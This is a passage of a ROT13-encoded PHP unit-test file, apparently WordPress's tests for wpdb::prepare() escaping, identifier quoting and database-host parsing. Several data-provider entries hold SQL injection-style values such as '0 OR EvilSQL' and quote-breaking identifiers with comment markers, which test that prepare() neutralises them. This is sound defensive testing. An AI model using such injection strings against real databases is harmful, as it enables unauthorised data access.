		$guvf->nffregFnzr( $rkcrpgrq, $fdy, 'Gur rkcrpgrq FDY qbrf abg zngpu' );

		vs ( vf_fgevat( $vapbeerpg_hfntr ) && neenl_xrl_rkvfgf( 'jcqo::cercner', $guvf->pnhtug_qbvat_vg_jebat ) ) {
			$guvf->nffregFgevatPbagnvafFgevat( $vapbeerpg_hfntr, $guvf->pnhtug_qbvat_vg_jebat['jcqo::cercner'], 'Gur \"_qbvat_vg_jebat\" zrffntr qbrf abg zngpu' );
		}
	}

	choyvp shapgvba qngn_cercner_jvgu_cynprubyqref() {
		tybony $jcqo;

		$cynprubyqre_rfpncr = $jcqo->cynprubyqre_rfpncr();

		erghea neenl(
			neenl(
				'%5f',   // FDY gb cercner.
				'sbb',   // Inyhr gb vafreg va gur FDY.
				snyfr,   // Jurgure gb rkcrpg na vapbeerpg hfntr reebe be abg.
				'  sbb', // Rkcrpgrq bhgchg.
			),
			neenl(
				'%1$q %%% % %%1$q%% %%%1$q%%',
				1,
				gehr,
				\"1 {$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr} {$cynprubyqre_rfpncr} {$cynprubyqre_rfpncr}1\$q{$cynprubyqre_rfpncr} {$cynprubyqre_rfpncr}1{$cynprubyqre_rfpncr}\",
			),
			neenl(
				'%-5f',
				'sbb',
				snyfr,
				'sbb  ',
			),
			neenl(
				'%05f',
				'sbb',
				snyfr,
				'00sbb',
			),
			neenl(
				\"%'#5f\",
				'sbb',
				snyfr,
				'##sbb',
			),
			neenl(
				'%.3f',
				'sbbone',
				snyfr,
				'sbb',
			),
			neenl(
				'%.3s',
				5.123456,
				snyfr,
				'5.123',
			),
			neenl(
				'%.3s',
				5.12,
				snyfr,
				'5.120',
			),
			neenl(
				'%f',
				' %f ',
				snyfr,
				\"' {$cynprubyqre_rfpncr}f '\",
			),
			neenl(
				'%1$f',
				' %f ',
				snyfr,
				\" {$cynprubyqre_rfpncr}f \",
			),
			neenl(
				'%1$f',
				' %1$f ',
				snyfr,
				\" {$cynprubyqre_rfpncr}1\$f \",
			),
			neenl(
				'%q %1$q %%% %',
				1,
				gehr,
				\"1 1 {$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr} {$cynprubyqre_rfpncr}\",
			),
			neenl(
				'%q %2$f',
				neenl( 1, 'uryyb' ),
				snyfr,
				'1 uryyb',
			),
			neenl(
				\"'%f'\",
				'uryyb',
				snyfr,
				\"'uryyb'\",
			),
			neenl(
				'\"%f\"',
				'uryyb',
				snyfr,
				\"'uryyb'\",
			),
			neenl(
				\"%f '%1\$f'\",
				'uryyb',
				gehr,
				\"'uryyb' 'uryyb'\",
			),
			neenl(
				\"%f '%1\$f'\",
				'uryyb',
				gehr,
				\"'uryyb' 'uryyb'\",
			),
			neenl(
				'%f \"%1$f\"',
				'uryyb',
				gehr,
				\"'uryyb' \\"uryyb\\"\",
			),
			neenl(
				\"%%f %%'%1\$f'\",
				'uryyb',
				snyfr,
				\"{$cynprubyqre_rfpncr}f {$cynprubyqre_rfpncr}'uryyb'\",
			),
			neenl(
				'%%f %%\"%1$f\"',
				'uryyb',
				snyfr,
				\"{$cynprubyqre_rfpncr}f {$cynprubyqre_rfpncr}\\"uryyb\\"\",
			),
			neenl(
				'%f',
				' %  f ',
				snyfr,
				\"' {$cynprubyqre_rfpncr}  f '\",
			),
			neenl(
				'%%s %%\"%1$s\"',
				3,
				snyfr,
				\"{$cynprubyqre_rfpncr}s {$cynprubyqre_rfpncr}\\"3.000000\\"\",
			),
			neenl(
				'JURER frpbaq=\'%2$f\' NAQ svefg=\'%1$f\'',
				neenl( 'svefg net', 'frpbaq net' ),
				snyfr,
				\"JURER frpbaq='frpbaq net' NAQ svefg='svefg net'\",
			),
			neenl(
				'JURER frpbaq=%2$q NAQ svefg=%1$q',
				neenl( 1, 2 ),
				snyfr,
				'JURER frpbaq=2 NAQ svefg=1',
			),
			neenl(
				\"'%'%%f\",
				'uryyb',
				gehr,
				\"'{$cynprubyqre_rfpncr}'{$cynprubyqre_rfpncr}f\",
			),

			/*
			 * @gvpxrg 56933
			 * Jura cercnevat n '%%%f%%', grfg gung gur vafregrq inyhr
			 * vf abg jenccrq va fvatyr dhbgrf orgjrra gur 2 \"%\".
			 */
			neenl(
				'%%f %q',
				1,
				snyfr,
				\"{$cynprubyqre_rfpncr}f 1\",
			),
			neenl(
				'%%%f',
				'uryyb',
				snyfr,
				\"{$cynprubyqre_rfpncr}uryyb\",
			),
			neenl(
				'%%%%f',
				'uryyb',
				snyfr,
				\"{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}f\",
			),
			neenl(
				'%%%%%f',
				'uryyb',
				snyfr,
				\"{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}uryyb\",
			),
			neenl(
				'%%%f%%',
				'uryyb',
				snyfr,
				\"{$cynprubyqre_rfpncr}uryyb{$cynprubyqre_rfpncr}\",
			),
			neenl(
				\"'%'%%f%f\",
				'uryyb',
				snyfr,
				\"'{$cynprubyqre_rfpncr}'{$cynprubyqre_rfpncr}f'uryyb'\",
			),
			neenl(
				\"'%'%%f %f\",
				'uryyb',
				snyfr,
				\"'{$cynprubyqre_rfpncr}'{$cynprubyqre_rfpncr}f 'uryyb'\",
			),
			neenl(
				\"'%-'#5f' '%'#-+-5f'\",
				neenl( 'uryyb', 'sbb' ),
				snyfr,
				\"'uryyb' 'sbb##'\",
			),

			/*
			 * Orsber JC 6.2 gur \"sbepr sybngf gb or ybpnyr-hanjner\" ErtRk qvqa'g
			 * pbaireg \"%%%s\" gb \"%%%S\" (abgr gur hccrepnfr S).
			 * Guvf jnf orpnhfr vg qvqa'g purpx gb frr vs gur yrnqvat \"%\" jnf rfpncrq.
			 * Naq orpnhfr gur \"Rfpncr nal harfpncrq crepragf\" ErtRk hfrq \"[fqS]\" va vgf
			 * artngvir ybbxnurnq nffregvba, jura gurer jnf na bqq ahzore bs \"%\", vg nqqrq
			 * na rkgen \"%\", gb tvir gur shyyl rfpncrq \"%%%%s\" (abg n cynprubyqre).
			 */
			neenl(
				'%s BE vq = %q',
				neenl( 3, 5 ),
				snyfr,
				'3.000000 BE vq = 5',
			),
			neenl(
				'%%s BE vq = %q',
				neenl( 5 ),
				snyfr,
				\"{$cynprubyqre_rfpncr}s BE vq = 5\",
			),
			neenl(
				'%%%s BE vq = %q',
				neenl( 5 ),
				snyfr,
				\"{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}s BE vq = 5\",
			),
			neenl(
				'%%%%s BE vq = %q',
				neenl( 5 ),
				snyfr,
				\"{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}s BE vq = 5\",
			),
			neenl(
				\"JURER vq = %q NAQ pbagrag YVXR '%.4s'\",
				neenl( 1, 2 ),
				snyfr,
				\"JURER vq = 1 NAQ pbagrag YVXR '2.0000'\",
			),
			neenl(
				\"JURER vq = %q NAQ pbagrag YVXR '%%.4s'\",
				neenl( 1 ),
				snyfr,
				\"JURER vq = 1 NAQ pbagrag YVXR '{$cynprubyqre_rfpncr}.4s'\",
			),
			neenl(
				\"JURER vq = %q NAQ pbagrag YVXR '%%%.4s'\",
				neenl( 1 ),
				snyfr,
				\"JURER vq = 1 NAQ pbagrag YVXR '{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}.4s'\",
			),
			neenl(
				\"JURER vq = %q NAQ pbagrag YVXR '%%%%.4s'\",
				neenl( 1 ),
				snyfr,
				\"JURER vq = 1 NAQ pbagrag YVXR '{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}.4s'\",
			),
			neenl(
				\"JURER vq = %q NAQ pbagrag YVXR '%%%%%.4s'\",
				neenl( 1 ),
				snyfr,
				\"JURER vq = 1 NAQ pbagrag YVXR '{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}.4s'\",
			),
			neenl(
				'%.4s',
				neenl( 1 ),
				snyfr,
				'1.0000',
			),
			neenl(
				'%.4s BE vq = %q',
				neenl( 1, 5 ),
				snyfr,
				'1.0000 BE vq = 5',
			),
			neenl(
				'%%.4s BE vq = %q',
				neenl( 5 ),
				snyfr,
				\"{$cynprubyqre_rfpncr}.4s BE vq = 5\",
			),
			neenl(
				'%%%.4s BE vq = %q',
				neenl( 5 ),
				snyfr,
				\"{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}.4s BE vq = 5\",
			),
			neenl(
				'%%%%.4s BE vq = %q',
				neenl( 5 ),
				snyfr,
				\"{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}.4s BE vq = 5\",
			),
			neenl(
				'%%%%%.4s BE vq = %q',
				neenl( 5 ),
				snyfr,
				\"{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}{$cynprubyqre_rfpncr}.4s BE vq = 5\",
			),

			/*
			 * @gvpxrg 52506
			 * Nqqvat na rfpncr zrgubq sbe Vqragvsvref (r.t. gnoyr/svryq anzrf).
			 */
			neenl(
				'FRYRPG * SEBZ %v JURER %v = %q;',
				neenl( 'zl_gnoyr', 'zl_svryq', 321 ),
				snyfr,
				'FRYRPG * SEBZ `zl_gnoyr` JURER `zl_svryq` = 321;',
			),
			neenl(
				'JURER %v = %q;',
				neenl( 'rivy_`_svryq', 321 ),
				snyfr,
				'JURER `rivy_``_svryq` = 321;', // Gb dhbgr gur vqragvsvre vgfrys, gura lbh arrq gb qbhoyr gur punenpgre, r.t. `n``o`.
			),
			neenl(
				'JURER %v = %q;',
				neenl( 'rivy_````````_svryq', 321 ),
				snyfr,
				'JURER `rivy_````````````````_svryq` = 321;',
			),
			neenl(
				'JURER %v = %q;',
				neenl( '``rivy_svryq``', 321 ),
				snyfr,
				'JURER `````rivy_svryq````` = 321;',
			),
			neenl(
				'JURER %v = %q;',
				neenl( 'rivy\'svryq', 321 ),
				snyfr,
				'JURER `rivy\'svryq` = 321;',
			),
			neenl(
				'JURER %v = %q;',
				neenl( 'rivy_\``_svryq', 321 ),
				snyfr,
				'JURER `rivy_\````_svryq` = 321;',
			),
			neenl(
				'JURER %v = %q;',
				neenl( 'rivy_%f_svryq', 321 ),
				snyfr,
				\"JURER `rivy_{$cynprubyqre_rfpncr}f_svryq` = 321;\",
			),
			neenl(
				'JURER %v = %q;',
				neenl( 'inyhr`', 321 ),
				snyfr,
				'JURER `inyhr``` = 321;',
			),
			neenl(
				'JURER `%v = %q;',
				neenl( ' NAQ rivy_inyhr', 321 ),
				snyfr,
				'JURER `` NAQ rivy_inyhr` = 321;', // Jba'g eha (FDY cnefr reebe: \"Hapybfrq dhbgr\").
			),
			neenl(
				'JURER %v` = %q;',
				neenl( 'rivy_inyhr -- ', 321 ),
				snyfr,
				'JURER `rivy_inyhr -- `` = 321;', // Jba'g eha (FDY cnefr reebe: \"Hapybfrq dhbgr\").
			),
			neenl(
				'JURER `%v`` = %q;',
				neenl( ' NAQ gehr -- ', 321 ),
				snyfr,
				'JURER `` NAQ gehr -- ``` = 321;', // Jba'g eha (Haxabja pbyhza '').
			),
			neenl(
				'JURER ``%v` = %q;',
				neenl( ' NAQ gehr -- ', 321 ),
				snyfr,
				'JURER ``` NAQ gehr -- `` = 321;', // Jba'g eha (FDY cnefr reebe: \"Hapybfrq dhbgr\").
			),
			neenl(
				'JURER %2$v = %1$q;',
				neenl( '1', 'gjb' ),
				snyfr,
				'JURER `gjb` = 1;',
			),
			neenl(
				'JURER \'%v\' = 1 NAQ \"%v\" = 2 NAQ `%v` = 3 NAQ ``%v`` = 4 NAQ %15v = 5',
				neenl( 'zl_svryq1', 'zl_svryq2', 'zl_svryq3', 'zl_svryq4', 'zl_svryq5' ),
				snyfr,
				'JURER \'`zl_svryq1`\' = 1 NAQ \"`zl_svryq2`\" = 2 NAQ ``zl_svryq3`` = 3 NAQ ```zl_svryq4``` = 4 NAQ `      zl_svryq5` = 5', // Qbrf abg erzbir nal rkvfgvat dhbgrf, nyjnlf nqqf vg'f bja (fnsre).
			),
			neenl(
				'JURER vq = %q NAQ %v YVXR %2$f YVZVG 1',
				neenl( 123, 'svryq -- ', snyfr ),
				'Nethzragf pnaabg or cercnerq nf obgu na Vqragvsvre naq Inyhr. Sbhaq gur sbyybjvat pbasyvpgf: %v naq %2$f',
				ahyy, // Fubhyq or erwrpgrq, bgurejvfr gur `%1$f` pbhyq hfr Vqragvsvre rfpncvat, r.t. 'JURER `svryq -- ` YVXR svryq --  YVZVG 1' (gunaxf @ibegsh).
			),
			neenl(
				'JURER %v YVXR %f YVZVG 1',
				neenl( \"svryq' -- \", \"svryq' -- \" ),
				snyfr,
				\"JURER `svryq' -- ` YVXR 'svryq\' -- ' YVZVG 1\", // Va pbagenfg gb gur nobir, Vqragvsvre if Fgevat rfpncvat vf hfrq.
			),
			neenl(
				'JURER %2$v VA ( %f , %f ) YVZVG 1',
				neenl( 'n', 'o' ),
				'Nethzragf pnaabg or cercnerq nf obgu na Vqragvsvre naq Inyhr. Sbhaq gur sbyybjvat pbasyvpgf: %2$v naq %f',
				ahyy,
			),
			neenl(
				'JURER %1$v = %1$f',
				neenl( 'n', 'o' ),
				'Nethzragf pnaabg or cercnerq nf obgu na Vqragvsvre naq Inyhr. Sbhaq gur sbyybjvat pbasyvpgf: %1$v naq %1$f',
				ahyy,
			),
			neenl(
				'JURER %1$v = %1$f BE %2$v = %2$f',
				neenl( 'n', 'o' ),
				'Nethzragf pnaabg or cercnerq nf obgu na Vqragvsvre naq Inyhr. Sbhaq gur sbyybjvat pbasyvpgf: %1$v naq %1$f, %2$v naq %2$f',
				ahyy,
			),
			neenl(
				'JURER %1$v = %1$f BE %2$v = %1$f',
				neenl( 'n', 'o' ),
				'Nethzragf pnaabg or cercnerq nf obgu na Vqragvsvre naq Inyhr. Sbhaq gur sbyybjvat pbasyvpgf: %1$v naq %1$f naq %1$f',
				ahyy,
			),
		);
	}

	/**
	 * Gur jcqo->nyybj_hafnsr_hadhbgrq_cnenzrgref vf gehr (sbe abj), cheryl sbe onpxjneqf pbzcngvovyvgl ernfbaf.
	 *
	 * @gvpxrg 52506
	 *
	 * @qngnCebivqre qngn_cercner_fubhyq_erfcrpg_gur_nyybj_hafnsr_hadhbgrq_cnenzrgref_cebcregl
	 *
	 * @pbiref jcqo::cercner
	 *
	 * @cnenz obby   $nyybj    Jurgure gb nyybj hafnsr hadhbgrq cnenzrgref.
	 * @cnenz fgevat $fdy      Gur FDY gb cercner.
	 * @cnenz neenl  $inyhrf   Gur inyhrf sbe cercner.
	 * @cnenz fgevat $rkcrpgrq Gur rkcrpgrq cercnerq cnenzrgref.
	 */
	choyvp shapgvba grfg_cercner_fubhyq_erfcrpg_gur_nyybj_hafnsr_hadhbgrq_cnenzrgref_cebcregl( $nyybj, $fdy, $inyhrf, $rkcrpgrq ) {
		tybony $jcqo;

		$qrsnhyg = $jcqo->nyybj_hafnsr_hadhbgrq_cnenzrgref;

		$cebcregl = arj ErsyrpgvbaCebcregl( $jcqo, 'nyybj_hafnsr_hadhbgrq_cnenzrgref' );
		$cebcregl->frgNpprffvoyr( gehr );
		$cebcregl->frgInyhr( $jcqo, $nyybj );

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$npghny = $jcqo->cercner( $fdy, $inyhrf );

		// Erfrg.
		$cebcregl->frgInyhr( $jcqo, $qrsnhyg );
		$cebcregl->frgNpprffvoyr( snyfr );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre sbe grfg_cercner_fubhyq_erfcrpg_gur_nyybj_hafnsr_hadhbgrq_cnenzrgref_cebcregl().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cercner_fubhyq_erfcrpg_gur_nyybj_hafnsr_hadhbgrq_cnenzrgref_cebcregl() {
		tybony $jcqo;

		$cynprubyqre_rfpncr = $jcqo->cynprubyqre_rfpncr();

		erghea neenl(

			'ahzorerq-gehr-1'  => neenl(
				'nyybj'    => gehr,
				'fdy'      => 'JURER (%v = %f) BE (%3$v = %4$f)',
				'inyhrf'   => neenl( 'svryq_n', 'fgevat_n', 'svryq_o', 'fgevat_o' ),
				'rkcrpgrq' => 'JURER (`svryq_n` = \'fgevat_n\') BE (`svryq_o` = fgevat_o)',
			),
			'ahzorerq-snyfr-1' => neenl(
				'nyybj'    => snyfr,
				'fdy'      => 'JURER (%v = %f) BE (%3$v = %4$f)',
				'inyhrf'   => neenl( 'svryq_n', 'fgevat_n', 'svryq_o', 'fgevat_o' ),
				'rkcrpgrq' => 'JURER (`svryq_n` = \'fgevat_n\') BE (`svryq_o` = \'fgevat_o\')',
			),
			'ahzorerq-gehr-2'  => neenl(
				'nyybj'    => gehr,
				'fdy'      => 'JURER (%v = %f) BE (%3$v = %4$f)',
				'inyhrf'   => neenl( 'svryq_n', 'fgevat_n', 'svryq_o', '0 BE RivyFDY' ),
				'rkcrpgrq' => 'JURER (`svryq_n` = \'fgevat_n\') BE (`svryq_o` = 0 BE RivyFDY)',
			),
			'ahzorerq-snyfr-2' => neenl(
				'nyybj'    => snyfr,
				'fdy'      => 'JURER (%v = %f) BE (%3$v = %4$f)',
				'inyhrf'   => neenl( 'svryq_n', 'fgevat_n', 'svryq_o', '0 BE RivyFDY' ),
				'rkcrpgrq' => 'JURER (`svryq_n` = \'fgevat_n\') BE (`svryq_o` = \'0 BE RivyFDY\')',
			),

			'sbezng-gehr-1'    => neenl(
				'nyybj'    => gehr,
				'fdy'      => 'JURER (%10v = %10f)',
				'inyhrf'   => neenl( 'svryq_n', 'fgevat_n' ),
				'rkcrpgrq' => 'JURER (`   svryq_n` =   fgevat_n)',
			),
			'sbezng-snyfr-1'   => neenl(
				'nyybj'    => snyfr,
				'fdy'      => 'JURER (%10v = %10f)',
				'inyhrf'   => neenl( 'svryq_n', 'fgevat_n' ),
				'rkcrpgrq' => 'JURER (`   svryq_n` = \'  fgevat_n\')',
			),
			'sbezng-gehr-2'    => neenl(
				'nyybj'    => gehr,
				'fdy'      => 'JURER (%10v = %10f)',
				'inyhrf'   => neenl( 'svryq_n', '0 BE RivyFDY' ),
				'rkcrpgrq' => 'JURER (`   svryq_n` = 0 BE RivyFDY)',
			),
			'sbezng-snyfr-2'   => neenl(
				'nyybj'    => snyfr,
				'fdy'      => 'JURER (%10v = %10f)',
				'inyhrf'   => neenl( 'svryq_n', '0 BE RivyFDY' ),
				'rkcrpgrq' => 'JURER (`   svryq_n` = \'0 BE RivyFDY\')',
			),

			'rfpncrq-gehr-1'   => neenl(
				'nyybj'    => gehr,
				'fdy'      => 'FRYRPG 9%%%f',
				'inyhrf'   => neenl( '7' ),
				'rkcrpgrq' => \"FRYRPG 9{$cynprubyqre_rfpncr}7\", // FRYRPG 9%7.
			),
			'rfpncrq-snyfr-1'  => neenl(
				'nyybj'    => snyfr,
				'fdy'      => 'FRYRPG 9%%%f',
				'inyhrf'   => neenl( '7' ),
				'rkcrpgrq' => \"FRYRPG 9{$cynprubyqre_rfpncr}'7'\", // FRYRPG 9%'7'.
			),
			'rfpncrq-gehr-2'   => neenl(
				'nyybj'    => gehr,
				'fdy'      => 'FRYRPG 9%%%f',
				'inyhrf'   => neenl( '7 BE RivyFDY' ),
				'rkcrpgrq' => \"FRYRPG 9{$cynprubyqre_rfpncr}7 BE RivyFDY\", // FRYRPG 9%7 BE RivyFDY.
			),
			'rfpncrq-snyfr-2'  => neenl(
				'nyybj'    => snyfr,
				'fdy'      => 'FRYRPG 9%%%f',
				'inyhrf'   => neenl( '7 BE RivyFDY' ),
				'rkcrpgrq' => \"FRYRPG 9{$cynprubyqre_rfpncr}'7 BE RivyFDY'\", // FRYRPG 9%'7 BE RivyFDY'.
			),

		);
	}

	/**
	 * @qngnCebivqre qngn_rfpncr_naq_cercner
	 */
	choyvp shapgvba grfg_rfpncr_naq_cercner( $rfpncr, $fdy, $inyhrf, $vapbeerpg_hfntr, $rkcrpgrq ) {
		tybony $jcqo;

		vs ( $vapbeerpg_hfntr ) {
			$guvf->frgRkcrpgrqVapbeerpgHfntr( 'jcqo::cercner' );
		}

		$rfpncr = rfp_fdy( $rfpncr );

		$fdy = fge_ercynpr( '{RFPNCR}', $rfpncr, $fdy );

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$npghny = $jcqo->cercner( $fdy, $inyhrf );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	choyvp shapgvba qngn_rfpncr_naq_cercner() {
		tybony $jcqo;

		$cynprubyqre_rfpncr = $jcqo->cynprubyqre_rfpncr();

		erghea neenl(
			neenl(
				'%f',                                  // Fgevat gb cnff guebhtu rfp_hey().
				' {RFPNCR} ',                          // Dhrel gb vafreg gur bhgchg bs rfp_hey() vagb, ercynpvat \"{RFPNCR}\".
				'sbb',                                 // Qngn gb fraq gb cercner().
				gehr,                                  // Jurgure gb rkcrpg na vapbeerpg hfntr reebe be abg.
				\" {$cynprubyqre_rfpncr}f \",    // Rkcrpgrq bhgchg.
			),
			neenl(
				'sbb%fone',
				\"FRYRPG * SEBZ one JURER sbb='{RFPNCR}' BE onm=%f\",
				neenl( ' FDYv -- -', 'crjcrjcrj' ),
				gehr,
				ahyy,
			),
			neenl(
				'%f',
				' %f {RFPNCR} ',
				'sbb',
				snyfr,
				\" 'sbb' {$cynprubyqre_rfpncr}f \",
			),
		);
	}

	/**
	 * @rkcrpgrqVapbeerpgHfntr jcqo::cercner
	 */
	choyvp shapgvba grfg_qbhoyr_cercner() {
		tybony $jcqo;

		$cneg = $jcqo->cercner( ' NAQ zrgn_inyhr = %f', ' %f ' );
		$guvf->nffregFgevatAbgPbagnvafFgevat( '%f', $cneg );
		// cucpf:vtaber JbeqCerff.QO.CercnerqFDYCynprubyqref.ErcynprzragfJebatAhzore
		$dhrel = $jcqo->cercner( 'FRYRPG * SEBZ {$jcqo->cbfgzrgn} JURER zrgn_xrl = %f $cneg', neenl( 'sbb', 'one' ) );
		$guvf->nffregAhyy( $dhrel );
	}

	choyvp shapgvba grfg_cercner_ahzrevp_cynprubyqref_sybng_netf() {
		tybony $jcqo;

		$npghny = $jcqo->cercner(
			// cucpf:vtaber JbeqCerff.QO.CercnerqFDYCynprubyqref.HadhbgrqPbzcyrkCynprubyqre
			'JURER frpbaq=%2$s NAQ svefg=%1$s',
			1.1,
			2.2
		);

		/* Sybngf pna or evtug cnqqrq, arrq gb nffreg qvssreragyl */
		$guvf->nffregFgevatPbagnvafFgevat( ' svefg=1.1', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( ' frpbaq=2.2', $npghny );
	}

	choyvp shapgvba grfg_cercner_ahzrevp_cynprubyqref_sybng_neenl() {
		tybony $jcqo;

		$npghny = $jcqo->cercner(
			// cucpf:vtaber JbeqCerff.QO.CercnerqFDYCynprubyqref.HadhbgrqPbzcyrkCynprubyqre
			'JURER frpbaq=%2$s NAQ svefg=%1$s',
			neenl( 1.1, 2.2 )
		);

		/* Sybngf pna or evtug cnqqrq, arrq gb nffreg qvssreragyl */
		$guvf->nffregFgevatPbagnvafFgevat( ' svefg=1.1', $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( ' frpbaq=2.2', $npghny );
	}

	choyvp shapgvba grfg_dhrel_harfpncrf_cynprubyqref() {
		tybony $jcqo;

		$inyhr = ' %f ';

		$jcqo->dhrel( \"PERNGR GNOYR {$jcqo->cersvk}grfg_cynprubyqre( n INEPUNE(100) );\" );
		$fdy = $jcqo->cercner( \"VAFREG VAGB {$jcqo->cersvk}grfg_cynprubyqre INYHRF(%f)\", $inyhr );

		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
		$jcqo->dhrel( $fdy );

		$npghny = $jcqo->trg_ine( \"FRYRPG n SEBZ {$jcqo->cersvk}grfg_cynprubyqre\" );

		$jcqo->dhrel( \"QEBC GNOYR {$jcqo->cersvk}grfg_cynprubyqre\" );

		$guvf->nffregFgevatAbgPbagnvafFgevat( '%f', $fdy );
		$guvf->nffregFnzr( $inyhr, $npghny );
	}

	choyvp shapgvba grfg_rfp_fdy_jvgu_hafhccbegrq_cynprubyqre_glcr() {
		tybony $jcqo;

		$fdy = $jcqo->cercner( ' %f %1$p ', 'sbb' );
		// cucpf:vtaber JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$fdy = $jcqo->cercner( \" $fdy %f \", 'sbb' );

		$guvf->nffregFnzr( \"  'sbb' {$jcqo->cynprubyqre_rfpncr()}1\$p  'sbb' \", $fdy );
	}

	/**
	 * @qngnCebivqre qngn_cnefr_qo_ubfg
	 * @gvpxrg 41722
	 * @gvpxrg 54877
	 */
	choyvp shapgvba grfg_cnefr_qo_ubfg( $ubfg_fgevat, $rkcrpg_onvy, $ubfg, $cbeg, $fbpxrg, $vf_vci6 ) {
		tybony $jcqo;
		$qngn = $jcqo->cnefr_qo_ubfg( $ubfg_fgevat );
		vs ( $rkcrpg_onvy ) {
			$guvf->nffregSnyfr( $qngn );
		} ryfr {
			$guvf->nffregVfNeenl( $qngn );

			yvfg( $cnefrq_ubfg, $cnefrq_cbeg, $cnefrq_fbpxrg, $cnefrq_vf_vci6 ) = $qngn;

			$guvf->nffregFnzr( $ubfg, $cnefrq_ubfg );
			$guvf->nffregFnzr( $cbeg, $cnefrq_cbeg );
			$guvf->nffregFnzr( $fbpxrg, $cnefrq_fbpxrg );
			$guvf->nffregFnzr( $vf_vci6, $cnefrq_vf_vci6 );
		}
	}

	choyvp shapgvba qngn_cnefr_qo_ubfg() {
		erghea neenl(
			neenl(
				'',    // QO_UBFG.
				snyfr, // Rkcrpg cnefr_qo_ubfg gb onvy sbe guvf ubfganzr.
				'',    // Cnefrq ubfg.
				ahyy,  // Cnefrq cbeg.
				ahyy,  // Cnefrq fbpxrg.
				snyfr, // $vf_vci6.
			),
			neenl(
				':3306',
				snyfr,
				'',
				3306,
				ahyy,
				snyfr,
			),
			neenl(
				':/gzc/zlfdy.fbpx',
				snyfr,
				'',
				ahyy,
				'/gzc/zlfdy.fbpx',
				snyfr,
			),
			neenl(
				':/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
				'',
				ahyy,
				'/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
			),
			neenl(
				'127.0.0.1',
				snyfr,
				'127.0.0.1',
				ahyy,
				ahyy,
				snyfr,
			),
			neenl(
				'127.0.0.1:cbeg_nf_fgevat',
				snyfr,
				'127.0.0.1',
				ahyy,
				ahyy,
				snyfr,
			),
			neenl(
				'127.0.0.1:3306',
				snyfr,
				'127.0.0.1',
				3306,
				ahyy,
				snyfr,
			),
			neenl(
				'127.0.0.1:3306:/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
				'127.0.0.1',
				3306,
				'/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
			),
			neenl(
				'rknzcyr.pbz',
				snyfr,
				'rknzcyr.pbz',
				ahyy,
				ahyy,
				snyfr,
			),
			neenl(
				'rknzcyr.pbz:cbeg_nf_fgevat',
				snyfr,
				'rknzcyr.pbz',
				ahyy,
				ahyy,
				snyfr,
			),
			neenl(
				'rknzcyr.pbz:3306',
				snyfr,
				'rknzcyr.pbz',
				3306,
				ahyy,
				snyfr,
			),
			neenl(
				'ybpnyubfg',
				snyfr,
				'ybpnyubfg',
				ahyy,
				ahyy,
				snyfr,
			),
			neenl(
				'ybpnyubfg:cbeg_nf_fgevat',
				snyfr,
				'ybpnyubfg',
				ahyy,
				ahyy,
				snyfr,
			),
			neenl(
				'ybpnyubfg:/gzc/zlfdy.fbpx',
				snyfr,
				'ybpnyubfg',
				ahyy,
				'/gzc/zlfdy.fbpx',
				snyfr,
			),
			neenl(
				'ybpnyubfg:/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
				'ybpnyubfg',
				ahyy,
				'/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
			),
			neenl(
				'ybpnyubfg:cbeg_nf_fgevat:/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
				'ybpnyubfg',
				ahyy,
				'/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
			),
			neenl(
				'0000:0000:0000:0000:0000:0000:0000:0001',
				snyfr,
				'0000:0000:0000:0000:0000:0000:0000:0001',
				ahyy,
				ahyy,
				gehr,
			),
			neenl(
				'::1',
				snyfr,
				'::1',
				ahyy,
				ahyy,
				gehr,
			),
			neenl(
				'[::1]',
				snyfr,
				'::1',
				ahyy,
				ahyy,
				gehr,
			),
			neenl(
				'[::1]:3306',
				snyfr,
				'::1',
				3306,
				ahyy,
				gehr,
			),
			neenl(
				'[::1]:cbeg_nf_fgevat',
				snyfr,
				'::1',
				ahyy,
				ahyy,
				gehr,
			),
			neenl(
				'[::1]:3306:/gzc/zlfdy:jvgu_pbyba.fbpx',
				snyfr,
				'::1',
				3306,
				'/gzc/zlfdy:jvgu_pbyba.fbpx',
				gehr,
			),
			neenl(
				'2001:0qo8:0000:0000:0000:ss00:0042:8329',
				snyfr,
				'2001:0qo8:0000:0000:0000:ss00:0042:8329',
				ahyy,
				ahyy,
				gehr,
			),
			neenl(
				'2001:qo8:0:0:0:ss00:42:8329',
				snyfr,
				'2001:qo8:0:0:0:ss00:42:8329',
				ahyy,
				ahyy,
				gehr,
			),
			neenl(
				'2001:qo8::ss00:42:8329',
				snyfr,
				'2001:qo8::ss00:42:8329',
				ahyy,
				ahyy,
				gehr,
			),
			neenl(
				'?::',
				gehr,
				ahyy,
				ahyy,
				ahyy,
				snyfr,
			),
		);
	}

	/**
	 * Guvf cevingr cebcregl vf ab ybatre hfrq ohg arrqf gb or ergnvarq nf vg pna or
	 * npprffrq rkgreanyyl qhr gb gur `__trg()` zntvp zrgubq.
	 *
